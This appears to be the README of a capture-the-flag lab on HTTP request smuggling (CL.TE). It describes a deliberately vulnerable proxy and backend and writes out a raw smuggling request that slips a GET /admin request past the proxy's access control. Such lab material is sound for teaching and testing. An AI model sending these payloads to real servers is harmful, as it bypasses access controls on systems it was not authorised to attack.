# Lab 05 — HTTP Request Smuggling (CL.TE)

## Architecture

```text
Attacker
   |
   | TCP :5005
   v
+--------------------------+
| Vulnerable Python proxy  |
|                          |
| ACL: blocks /admin       |
| Boundary: Content-Length |
+------------+-------------+
             |
             | TCP :8000
             v
+--------------------------+
| Vulnerable Python server |
|                          |
| Boundary: Transfer-Enc.  |
| Keeps connection alive   |
+--------------------------+
```

The frontend and backend intentionally disagree about the request boundary.

- Frontend: uses `Content-Length` even when `Transfer-Encoding` is present.
- Backend: prioritizes `Transfer-Encoding: chunked`.
- Frontend applies the `/admin` ACL only to the request line it parses.
- The frontend forwards the original bytes without normalizing the headers.

This makes the lab deterministic and avoids depending on the behavior of a
particular historical nginx release.

## Start

```bash
docker compose up --build
```

Then open:

```text
http://localhost:5005
```

## Goal

Reach `/admin` from outside and retrieve the flag.

## CL.TE idea

The attacker sends:

```http
POST /post HTTP/1.1
Host: localhost:5005
Content-Length: 50
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost:5005

GET / HTTP/1.1
Host: localhost:5005

```

The frontend sees the first request as having a 50-byte body. The 50 bytes
are forwarded unchanged to the backend.

The backend instead uses `Transfer-Encoding: chunked` and therefore considers
`0\r\n\r\n` to be the end of the POST body. The remaining bytes form a new
request:

```http
GET /admin HTTP/1.1
Host: localhost:5005
```

The frontend never parses `/admin` as a top-level request, so its ACL is not
applied to that smuggled request.

## Python exploit

```bash
python3 exploit.py
```

The script uses a raw TCP socket deliberately. It does not use `requests` or
`curl`, because the exercise is about controlling the exact bytes on the wire.
